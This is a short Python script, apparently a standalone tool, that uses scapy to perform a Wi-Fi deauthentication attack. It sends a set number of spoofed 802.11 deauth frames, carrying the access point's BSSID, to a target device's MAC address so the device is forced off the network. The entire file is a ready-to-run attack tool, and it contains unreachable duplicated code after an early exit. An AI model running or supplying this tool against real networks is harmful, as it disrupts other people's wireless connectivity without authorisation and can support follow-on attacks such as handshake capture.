from scapy.all import *
from argparse import ArgumentParser as AP
from sys import exit

def attack(iface : str, target : str, count : int , bssid: str):
    dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    for i in range(count):
        sendp(frame, iface=iface)
        print("Sent Deauth to {}".format(target))

if __name__ == "__main__":
    parser = AP(description="Deauth Attack")
    parser.add_argument("-i", "--interface", help="Interface to use", required=True)
    parser.add_argument("-t", "--target", help="Target MAC address", required=True)
    parser.add_argument("-c", "--count", help="Number of packets to send", required=True)
    parser.add_argument("-b", "--bssid", help="BSSID of the AP", required=True)
    args = parser.parse_args()
    attack(args.interface, args.target, int(args.count), args.bssid)
    exit(0)
    #print(args.interface, args.target, args.count, args.bssid)
    #attack(args.interface, args.target, int(args.count), args.bssid)
    #exit(0)
    if (not args.interface or not args.target or not args.count or not args.bssid):
        print("[!] Missing arguments Please check help. 'deauth_attack.py -h'")
        exit(1)
    attack(args.interface, args.target, int(args.count), args.bssid)
    exit(0)
    #print(args.interface, args.target, args.count, args.bssid)
    